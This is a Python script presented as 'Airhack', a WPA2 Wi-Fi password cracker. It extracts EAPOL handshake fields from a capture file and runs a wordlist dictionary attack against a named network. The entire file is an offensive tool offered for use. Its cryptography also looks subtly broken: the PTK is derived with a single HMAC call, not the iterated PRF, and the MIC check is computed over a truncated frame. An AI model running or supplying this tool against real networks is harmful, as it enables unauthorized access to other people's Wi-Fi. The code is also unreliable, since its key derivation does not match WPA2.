import argparse
import hashlib
import hmac
import os
from pbkdf2 import PBKDF2
from scapy.all import rdpcap, EAPOL

# Extract EAPOL handshake packets from .cap file
def extract_handshake(pcap_file):
    try:
        packets = rdpcap(pcap_file)
    except Exception as e:
        print(f"[-] Error reading capture file: {e}")
        return None

    handshake_packets = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
    if len(handshake_packets) >= 2:
        print(f"[+] Found {len(handshake_packets)} EAPOL packets in the capture file.")
        return handshake_packets
    else:
        print("[-] No valid handshake found in the capture file.")
        return None

# Derive the Pairwise Master Key (PMK) using PBKDF2
def derive_pmk(ssid, password):
    return PBKDF2(password, ssid.encode(), count=4096, dkLen=32).read()

# Derive the Pairwise Transient Key (PTK)
def derive_ptk(pmk, anonce, snonce, ap_mac, client_mac):
    # WPA2 PTK is derived using HMAC-SHA1
    data = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    return hmac.new(pmk, b"Pairwise key expansion" + data, hashlib.sha1).digest()[:16]

# Compare the derived PTK with the handshake MIC
def validate_mic(ptk, mic, eapol_frame):
    calculated_mic = hmac.new(ptk, eapol_frame, hashlib.sha1).digest()[:16]
    return mic == calculated_mic

# Perform dictionary attack to find the correct password
def crack_password(pcap_file, wordlist, ssid):
    handshake = extract_handshake(pcap_file)
    if not handshake:
        return

    # Extract required handshake parameters
    try:
        ap_mac = bytes.fromhex(handshake[0].addr2.replace(":", ""))  # AP MAC
        client_mac = bytes.fromhex(handshake[0].addr1.replace(":", ""))  # Client MAC
        anonce = handshake[0].load[13:45]  # Extract ANonce
        snonce = handshake[1].load[13:45]  # Extract SNonce
        mic = handshake[1].load[-18:-2]  # Extract MIC (last 16 bytes)
        eapol_frame = handshake[1].load[:-18]  # Extract EAPOL frame (without MIC)
    except Exception as e:
        print(f"[-] Error extracting handshake parameters: {e}")
        return

    print("[+] Extracted handshake parameters successfully.")
    print(f"    AP MAC: {ap_mac.hex()}")
    print(f"    Client MAC: {client_mac.hex()}")
    print(f"    ANonce: {anonce.hex()}")
    print(f"    SNonce: {snonce.hex()}")
    print(f"    MIC: {mic.hex()}")

    # Open the wordlist and attempt to find the correct password
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist file {wordlist} not found.")
        return

    with open(wordlist, 'r', encoding='utf-8') as file:
        for password in file:
            password = password.strip()
            pmk = derive_pmk(ssid, password)
            ptk = derive_ptk(pmk, anonce, snonce, ap_mac, client_mac)
            if validate_mic(ptk, mic, eapol_frame):
                print(f"[+] Password found: {password}")
                return

    print("[-] Password not found in the provided wordlist.")

# Main function for argument parsing and execution
def main():
    parser = argparse.ArgumentParser(description="Airhack: WPA2 Password Cracking Tool")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file (e.g., wordlist.txt)")
    parser.add_argument("pcap", help="Path to the capture file containing the WPA2 handshake (e.g., capture.cap)")
    parser.add_argument("ssid", help="SSID of the target Wi-Fi network")
    args = parser.parse_args()

    crack_password(args.pcap, args.wordlist, args.ssid)

if __name__ == "__main__":
    main()
